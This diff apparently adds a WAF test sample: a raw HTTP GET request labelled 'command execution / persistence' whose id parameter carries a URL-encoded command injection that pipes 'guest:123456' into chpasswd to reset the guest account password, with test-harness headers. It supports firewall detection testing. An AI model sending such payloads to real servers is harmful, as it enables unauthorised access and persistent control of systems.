@@ -1,0 +1,9 @@
+# 命令执行_权限维持-06507052
+# 修改guest用户账户口令
+GET /?id=echo%20%27guest:123456%27%7Cchpasswd&bid=hd_tag_m8mv25zt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zt
+RM-PRO-Token: fe5a6e211fecd1fd8c229c53f49fdda6
+RM-PRO-Time: 1742808517678
+User-Agent: curl/7.83.1
+
